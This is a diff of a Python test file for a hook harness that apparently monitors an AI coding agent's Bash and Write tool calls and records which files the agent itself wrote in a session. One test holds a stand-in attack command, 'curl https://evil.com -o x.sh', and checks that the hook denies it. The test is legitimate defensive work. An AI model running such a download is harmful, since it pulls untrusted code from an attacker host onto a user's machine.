@@ -344,30 +344,113 @@ def test_watchdog_docstring_matches_values():
     assert hookmain.watchdog("gate") == 1795 and hookmain.watchdog("fetch") == 55
 
 
-def test_post_tool_use_records_bash_writes(henv):
-    # automated commit review: a script written through Bash must count as self-written too
+def test_pre_tool_use_records_bash_writes_against_the_starting_cwd(henv):
+    # automated commit review: a script written through Bash must count as self-written too, recorded before
+    # the command runs (PostToolUse may never fire), relative to the event cwd
+    data, ws = Path(henv["CLAUDE_PLUGIN_DATA"]), Path(henv["CLAUDE_PROJECT_DIR"])
+    (data / "sessions" / "ok" / "written.json").write_text("[]")
+    (ws / "sub").mkdir()
+    assert hookmain.main("PreToolUse", bash("printf x > run.sh", str(ws / "sub")), henv) == (0, None)
+    rec = json.loads((data / "sessions" / "ok" / "written.json").read_text())
+    assert os.path.realpath(ws / "sub" / "run.sh") in rec
+
+
+def test_denied_bash_is_not_recorded(henv):
+    data, ws = Path(henv["CLAUDE_PLUGIN_DATA"]), Path(henv["CLAUDE_PROJECT_DIR"])
+    (data / "sessions" / "ok" / "written.json").write_text("[]")
+    assert hookmain.main("PreToolUse", bash(f"curl https://evil.com -o {ws / 'x.sh'}", str(ws)), henv)[0] == 2
+    assert json.loads((data / "sessions" / "ok" / "written.json").read_text()) == []
+
+
+def test_pre_tool_use_unresolvable_bash_write_drops_the_record(henv, monkeypatch):
+    from harness_core import pathtrack
+
+    data, ws = Path(henv["CLAUDE_PLUGIN_DATA"]), Path(henv["CLAUDE_PROJECT_DIR"])
+    (data / "sessions" / "ok" / "written.json").write_text("[]")
+    monkeypatch.setattr(pathtrack, "bash_write_targets", lambda cmd, ctx: [str(ws / "a"), None])
+    assert hookmain.main("PreToolUse", bash("touch a", str(ws)), henv) == (0, None)  # strict fallback, not a deny
+    assert not (data / "sessions" / "ok" / "written.json").exists()
+
+
+def test_post_tool_use_ignores_bash(henv):
     data, ws = Path(henv["CLAUDE_PLUGIN_DATA"]), Path(henv["CLAUDE_PROJECT_DIR"])
     (data / "sessions" / "s1").mkdir(parents=True)
     (data / "sessions" / "s1" / "written.json").write_text("[]")
-    evt = {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": f"printf 'x' > {ws / 'run.sh'}"}}
+    evt = {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": 'printf x > "$(mktemp)"'}}
     assert hookmain.main("PostToolUse", evt, henv) == (0, None)
-    rec = json.loads((data / "sessions" / "s1" / "written.json").read_text())
-    assert os.path.realpath(ws / "run.sh") in rec
+    assert json.loads((data / "sessions" / "s1" / "written.json").read_text()) == []
 
 
-def test_post_tool_use_unresolvable_bash_write_drops_the_record(henv):
-    data = Path(henv["CLAUDE_PLUGIN_DATA"])
+def test_post_tool_use_failure_records_writes(henv):
+    data, ws = Path(henv["CLAUDE_PLUGIN_DATA"]), Path(henv["CLAUDE_PROJECT_DIR"])
     (data / "sessions" / "s1").mkdir(parents=True)
     (data / "sessions" / "s1" / "written.json").write_text("[]")
-    evt = {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": 'printf x > "$(mktemp)"'}}
-    hookmain.main("PostToolUse", evt, henv)
-    assert not (data / "sessions" / "s1" / "written.json").exists()  # strict fallback from now on
+    evt = {"session_id": "s1", "tool_name": "Write", "tool_input": {"file_path": str(ws / "half.py")},
+           "error": "disk full"}
+    assert hookmain.main("PostToolUseFailure", evt, henv) == (0, None)
+    assert json.loads((data / "sessions" / "s1" / "written.json").read_text()) == [os.path.realpath(ws / "half.py")]
 
 
-def test_post_tool_use_hook_matches_bash(env):
-    cfg = json.loads((env["root"] / "hooks" / "hooks.json").read_text())
-    import re as _re
-    assert any(_re.fullmatch(g.get("matcher", ".*"), "Bash") for g in cfg["hooks"]["PostToolUse"])
+def test_recorded_directory_covers_files_under_it(henv):
+    # cp -r / tar -x record the destination directory; every file under it is self-written
+    from harness_core import written
+
+    data, ws = Path(henv["CLAUDE_PLUGIN_DATA"]), Path(henv["CLAUDE_PROJECT_DIR"])
+    (ws / "dst" / "deep").mkdir(parents=True)
+    (ws / "dst" / "deep" / "x.py").write_text("")
+    (ws / "dstother.py").write_text("")
+    (data / "sessions" / "s1").mkdir(parents=True)
+    (data / "sessions" / "s1" / "written.json").write_text(json.dumps([os.path.realpath(ws / "dst")]))
+    got = written.self_written(data, "s1", ws)
+    assert os.path.realpath(ws / "dst" / "deep" / "x.py") in got
+    assert os.path.realpath(ws / "dstother.py") not in got  # a prefix match is per path component
+
+
+def test_untrusted_files_is_ctime_since_session_start(henv):
+    from harness_core import written
+
+    ws, data = Path(henv["CLAUDE_PROJECT_DIR"]), Path(henv["CLAUDE_PLUGIN_DATA"])
+    for n in ("tracked.py", "old_untracked.py"):
+        (ws / n).write_text("")
+    (ws / ".git").mkdir()
+    fake_git = lambda argv, **kw: types.SimpleNamespace(returncode=0, stdout=b"tracked.py\0")
+    written.start(data, "s1", ws, run=fake_git)
+    time.sleep(0.01)
+    (ws / "new.py").write_text("")
+    (ws / ".git" / "HEAD").write_text("")
+    ctx = hookmain.build_ctx({"session_id": "s1"}, henv, "PreToolUse")
+    r = os.path.realpath
+    assert r(ws / "new.py") in ctx.untrusted_files
+    assert not {r(ws / "tracked.py"), r(ws / "old_untracked.py"), r(ws / ".git" / "HEAD")} & ctx.untrusted_files
+    assert r(ws / "new.py") not in ctx.written_this_task  # the record is intact, so it is not the fallback
+
+
+def test_build_ctx_walks_the_workspace_once(henv, monkeypatch):
+    from harness_core import written
+
+    ws, data = Path(henv["CLAUDE_PROJECT_DIR"]), Path(henv["CLAUDE_PLUGIN_DATA"])
+    written.start(data, "s1", ws, run=lambda argv, **kw: types.SimpleNamespace(returncode=1, stdout=b""))
+    (data / "sessions" / "s1" / "written.json").unlink()  # strict fallback needs the walk too
+    real, tops = os.walk, []
+    monkeypatch.setattr(os, "walk", lambda top, *a, **k: tops.append(os.fspath(top)) or real(top, *a, **k))
+    hookmain.build_ctx({"session_id": "s1"}, henv, "PreToolUse")
+    assert tops.count(os.fspath(ws)) == 1
+
+
+def test_concurrent_appends_are_not_lost(henv, tmp_path):
+    data, ws = henv["CLAUDE_PLUGIN_DATA"], henv["CLAUDE_PROJECT_DIR"]
+    (Path(data) / "sessions" / "s1").mkdir(parents=True)
+    (Path(data) / "sessions" / "s1" / "written.json").write_text("[]")
+    code = (
+        "import sys, types; sys.path.insert(0, sys.argv[1]); from harness_core import written\n"
+        "ctx = types.SimpleNamespace(data_root=sys.argv[2], workspace=sys.argv[3])\n"
+        "for i in range(20):\n"
+        "    written.on_post({'session_id': 's1', 'tool_name': 'Write',"
+        " 'tool_input': {'file_path': f'{sys.argv[3]}/{sys.argv[4]}{i}'}}, ctx)\n"
+    )
+    procs = [subprocess.Popen([sys.executable, "-I", "-c", code, str(ROOT / "lib"), data, ws, tag]) for tag in "ab"]
+    assert [p.wait(timeout=60) for p in procs] == [0, 0]
+    assert len(json.loads((Path(data) / "sessions" / "s1" / "written.json").read_text())) == 40
 
 
 def test_ctx_cwd_is_the_event_cwd_but_workspace_stays_project_dir(henv, tmp_path):
